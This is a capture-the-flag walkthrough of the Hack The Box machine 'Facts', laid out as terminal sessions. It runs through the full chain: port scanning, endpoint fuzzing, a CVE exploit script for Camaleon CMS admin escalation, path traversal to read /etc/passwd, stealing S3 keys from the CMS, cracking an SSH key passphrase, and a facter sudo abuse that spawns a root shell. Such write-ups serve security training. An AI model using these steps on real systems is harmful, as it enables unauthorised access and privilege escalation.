@@ -1,0 +1,240 @@
+[nmap]
+
+┌──(kali㉿kali)-[~/HTB/Facts]
+└─$ nmap -p- 10.129.25.224 --min-rate=1000               
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-08 09:24 -0500
+Nmap scan report for 10.129.25.224
+Host is up (0.094s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+54321/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 73.96 seconds
+______________________________________________
+
+[Fuzzing Endpoints]
+┌──(kali㉿kali)-[~/HTB/Facts]
+└─$ ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://facts.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 567ms]
+index                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 773ms]
+.html                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 1152ms]
+search                  [Status: 200, Size: 19187, Words: 3276, Lines: 272, Duration: 1447ms]
+.txt                    [Status: 500, Size: 7918, Words: 1035, Lines: 115, Duration: 1501ms]
+.php                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 1585ms]
+.aspx                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 1611ms]
+{and many more...}
+
+[We can register an account then use: https://github.com/predyy/CVE-2025-2304 to get admin privilege ]
+
+┌──(kali㉿kali)-[~/HTB/Facts/Tools/CVE-2025-2304]
+└─$ python3 exp.py http://facts.htb Shin Password
+[*] Logging in as Shin ...
+[+] Login successful
+[+] Got profile page
+[i] Version detected: 2.9.0 (< 2.9.1) - appears to be vulnerable version
+[+] authenticity_token: uPdeXUZIle_kOVyc_Dbl7jQF1_E9V1uuqwcD6au5AruzdSkoMoqwRxqDZ8HiHUmFhpvBnM8383bLUE-EN__Z1g
+http://facts.htb/admin/users/5/updated_ajax
+[*] Submitting password change request
+[+] Submit successful, you should be admin
+
+[ (CVE-2024-46987):  With admin access to the Camaleon CMS, exploit the authenticated path traversal vulnerability in the file download functionality: ]
+
+Access the endpoint: https://facts.htb/admin/media/download_private_file?file=../../../../etc/passwd
+
+`Result`
+```     
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+pollinate:x:103:1::/var/cache/pollinate:/bin/false
+polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
+syslog:x:104:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
+tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
+william:x:1001:1001::/home/william:/bin/bash
+_laurel:x:101:988::/var/log/laurel:/bin/false
+```
+
+[ In the Web Interface...]
+
+1) Navigate to CMS Settings → Filesystem and Retrieve access keys stored in plaintext. 
+credentials:
+        Access Key: <key>
+        Secret Key: <key>
+
+# The next step was :
+
+```
+3. Enumerate and Sync S3 Buckets
+    Use the AWS CLI with the retrieved keys:
+          $ aws s3 ls --endpoint-url http://facts.htb:54321 --profile facts
+```
+
+But we got errors such as :
+```
+ ┌──(kali㉿kali)-[~/HTB/Facts]
+
+└─$ aws s3 ls --endpoint-url http://facts.htb:54321 --profile facts   
+The config profile (facts) could not be found
+
+```
+
+# We solved it the easy way by exporting these in the terminal
+    export AWS_ACCESS_KEY_ID=KEY 
+    export AWS_SECRET_ACCESS_KEY=KEY
+    export AWS_DEFAULT_REGION=us-east-1
+
+[ Then Finally we got it working...]
+
+┌──(kali㉿kali)-[~/HTB/Facts]
+└─$ aws s3 ls --endpoint-url http://facts.htb:54321                   
+2025-09-11 08:06:52 internal
+2025-09-11 08:06:52 randomfacts
+                               
+# Syncing the internal bucket we got:
+
+┌──(kali㉿kali)-[~/HTB/Facts]
+└─$ aws s3 sync s3://internal . --endpoint-url http://facts.htb:54321
+                                                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/HTB/Facts]
+└─$ ls -lar                          
+total 56
+drwxrwxr-x 3 kali kali 4096 Feb  8 09:51 Tools
+drwxrwxr-x 2 kali kali 4096 Feb  8 10:27 .ssh
+-rw-rw-r-- 1 kali kali  807 Jan  8 13:47 .profile
+-rw-rw-r-- 1 kali kali 1809 Feb  8 09:59 passwd
+-rw-rw-r-- 1 kali kali   20 Jan  8 13:47 .lesshst
+-rw-rw-r-- 1 kali kali 1024 Feb  8 10:27 .documentation.md.swp
+-rw-rw-r-- 1 kali kali 7148 Feb  8 10:27 documentation.md
+drwxrwxr-x 2 kali kali 4096 Feb  8 10:27 .cache
+drwxrwxr-x 3 kali kali 4096 Feb  8 10:27 .bundle
+-rw-rw-r-- 1 kali kali 3900 Jan  8 13:45 .bashrc
+-rw-rw-r-- 1 kali kali  220 Jan  8 13:45 .bash_logout
+drwxrwxr-x 6 kali kali 4096 Feb  8 09:22 ..
+drwxrwxr-x 6 kali kali 4096 Feb  
+
+[ Found a ssh key...]
+                                                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/HTB/Facts]
+└─$ find . -name "id_ed25519"
+./.ssh/id_ed25519
+                     
+# Cracking the Key
+
+┌──(kali㉿kali)-[~/HTB/Facts]
+└─$ ssh2john          
+Usage: /usr/bin/ssh2john <RSA/DSA/EC/OpenSSH private key file(s)>
+                                                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/HTB/Facts]
+└─$ ssh2john  id_rsa > id_hash    
+                                                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/HTB/Facts]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_hash   
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 24 for all loaded hashes
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+FIND_IT_YOURSELF      (id_rsa)     
+1g 0:00:02:00 DONE (2026-02-08 10:36) 0.008296g/s 26.54p/s 26.54c/s 26.54C/s 123456m..imissu
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+[ Then use Trivia that we found in the /etc/passwd to log in using the creds we just found ]
+
+┌──(kali㉿kali)-[~/HTB/Facts]
+└─$ ssh -i id_rsa trivia@facts.htb  
+Enter passphrase for key 'id_rsa': 
+Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
+Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sun Feb  8 03:44:50 PM UTC 2026
+
+  System load:           0.0
+  Usage of /:            73.4% of 7.28GB
+  Memory usage:          19%
+  Swap usage:            0%
+  Processes:             221
+  Users logged in:       1
+  IPv4 address for eth0: 10.129.25.224
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:589c
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+trivia@facts:~$ 
+
+# We found this has sudo permissions:
+
+trivia@facts:/home/william$ sudo -l
+Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+
+[ I did this using AI]
+
+[ Creating an exploit file : this script tells facter to run a system command (spawning a shell) when it loads.]
+trivia@facts:/home/william$ echo 'Facter.add(:root_me) do setcode { system("/bin/bash") } end' > /tmp/exploit.rb
+
+[ This tells the system to run facter with root privileges, look in /tmp for your custom script, and call the "fact" named root_me. ]
+trivia@facts:/home/william$ sudo /usr/bin/facter --custom-dir=/tmp root_me
+root@facts:/home/william#
